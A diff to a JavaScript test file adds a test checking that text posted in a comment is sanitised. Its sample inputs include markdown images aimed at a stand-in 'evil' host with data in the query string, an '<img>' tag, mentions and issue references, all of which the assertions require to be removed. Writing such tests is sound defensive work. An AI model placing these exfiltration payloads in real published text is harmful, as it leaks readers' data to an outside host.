@@ -6,7 +6,7 @@ import {
   isSemverRange, lowers, parseAlias, parseStrictJson, registryProblems, buildPackageJson, lockPackageNames, lockVersions, lockResolutions, lockDowngrades, compareVersions, openEnded, neutralise,
   pathProblems, patchShapeProblems, credentialProblems, cleanTitle,
 } from "../tools/checks.mjs";
-import { auditCounts } from "../tools/verify.mjs";
+import { auditCounts, safeProblem } from "../tools/verify.mjs";
 import { alertIds, taskIds, SECURITY_BRANCH, branchIssue } from "../tools/gate.mjs";
 
 let n = 0;
@@ -198,6 +198,11 @@ t("published text is neutralised", () => {
   assert.ok(!n.includes("evil/p.png") && !n.includes("<img"));
   const r = neutralise("See ![x][leak] and ![leak] and !![y][leak]\n\n[leak]: https://evil/p.png?d=abc\n");
   assert.ok(!r.includes("!["), r);
+});
+t("problems posted in a comment are cleaned", () => {
+  const p = safeProblem('package.json: the key "![x](https://evil/p.png?d=abc)" appears twice. cc @someone ![y][r] <img src=x> fixes #3');
+  assert.ok(!p.includes("![") && !p.includes("evil/p.png") && !p.includes("<img") && !/@someone/.test(p) && !/#3/.test(p), p);
+  assert.ok(/^[\x20-\x7e]*$/.test(p));
 });
 t("paths", () => {
   const o = { pm: "npm", projectDirs: [".", "scripts/baseline"], codePaths: ["src/"], protectedPaths: ["src/content/"] };
